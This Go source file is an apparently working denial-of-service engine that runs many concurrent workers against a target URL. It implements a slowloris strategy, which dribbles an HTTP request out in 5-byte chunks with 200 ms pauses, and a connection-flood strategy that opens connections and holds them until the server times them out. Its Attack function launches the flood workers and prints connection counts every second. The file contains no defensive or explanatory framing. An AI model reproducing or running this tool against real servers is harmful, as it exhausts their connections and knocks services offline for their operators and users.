package main

import (
	"fmt"
	"time"
	"strings"
	"sync"
)

const (
	SLOWLORIS_CHUNK_SIZE = 5
	SLOWLORIS_CHUNK_DELAY = 200
)

type Engine struct {
	url string
	concurrency uint

	lock sync.Mutex

	activeWorkers uint
	attemptedConnections uint
	failedConnections uint
	successConnections uint
	interruptedConnections uint
}

func (ctx* Engine) incActiveWorker() {
	ctx.lock.Lock()
	ctx.activeWorkers++
	ctx.lock.Unlock()
}

func (ctx* Engine) decActiveWorker() {
	ctx.lock.Lock()
	ctx.activeWorkers--
	ctx.lock.Unlock()
}

func (ctx* Engine) incAttemptedConnections() {
	ctx.lock.Lock()
	ctx.attemptedConnections++
	ctx.lock.Unlock()
}

func (ctx* Engine) incFailedConnections() {
	ctx.lock.Lock()
	ctx.failedConnections++
	ctx.lock.Unlock()
}

func (ctx* Engine) incSuccessConnections() {
	ctx.lock.Lock()
	ctx.successConnections++
	ctx.lock.Unlock()
}

func (ctx* Engine) incInterruptedConnections() {
	ctx.lock.Lock()
	ctx.interruptedConnections++
	ctx.lock.Unlock()
}

func (ctx* Engine) slowlorisStrategy(id uint) {
	attackLoop: for {
		time.Sleep(time.Duration(10 * time.Millisecond))

		logger.Debug("W", id, "Attempting to connect")

		ctx.incAttemptedConnections()
		
		sock, err := Connect(ctx.url)
		
		if err != nil {
			logger.Debug("W", id, "Connect failed:", err)
			ctx.incFailedConnections()
			continue
		}
		

		req := CreateRequest(ctx.url)
		rdr := strings.NewReader(req)
		
		chunk := make([]byte, SLOWLORIS_CHUNK_SIZE)
		for {
			chunkSize, err := rdr.Read(chunk)

			if chunkSize == 0 {
				logger.Debug("No more chunks...")
				break
			}

			if err != nil {
				logger.Errorf("Unable o partition request string (%s), continuing...", err)
				sock.Close()
				continue attackLoop
			}

			logger.Debugf("Sending chunk (%s) #%d#", chunk[0:chunkSize], chunkSize)
			_, err = sock.Write(chunk[0:chunkSize])

			if err != nil {
				logger.Errorf("Unable to write socket (%s), continuing...", err)
				sock.Close()
				continue attackLoop
			}
			
			time.Sleep(time.Duration(SLOWLORIS_CHUNK_DELAY * time.Millisecond))
		}

		// recv ?
		sock.Close()

	}
}

func (ctx* Engine) connectionFloodStrategy(id uint) {
	buf := make([]byte, 1)
	for {
		time.Sleep(time.Duration(10 * time.Millisecond))
		ctx.incAttemptedConnections()

		sock, err := Connect(ctx.url)
		
		if err != nil {
			logger.Debug("W", id, "Connect failed:", err)
			ctx.incFailedConnections()
			continue
		}

		ctx.incSuccessConnections()

		// just a watcher that unblocks when server times-out connection
		_, err = sock.Read(buf)

		if err != nil {
			ctx.incInterruptedConnections()
		}		

		sock.Close()
	}
}

func (ctx* Engine) report() {
	// activeWorkers uint
	// attemptedConnections uint
	// failedConnections uint
	// successConnections uint
	// interruptedConnections uint

	fmt.Printf("Report:\n\tWorkers: %d\n\tAttempted conns: %d\n\tFailed conns: %d\n\tSuccess conns: %d\n\tInterrupted conns: %d\n",
		ctx.activeWorkers,
		ctx.attemptedConnections,
		ctx.failedConnections,
		ctx.successConnections,
		ctx.interruptedConnections,
	)
}

func NewEngine(url string, concurrency uint) Engine {
	return Engine {
		url: url,
		concurrency: concurrency,
		activeWorkers: 0,
		lock: sync.Mutex {},
	}
}

func (ctx* Engine) Attack() {
	ctx.activeWorkers = 0

	logger.Info("Spawning workers...")
	for i := uint(0); i < ctx.concurrency; i++ {
		go ctx.connectionFloodStrategy(i)
		ctx.incActiveWorker()
	}
	
	for ctx.activeWorkers > 0 {
		time.Sleep(time.Second)
		ctx.report()
	}

	logger.Info("Ending attack...")
}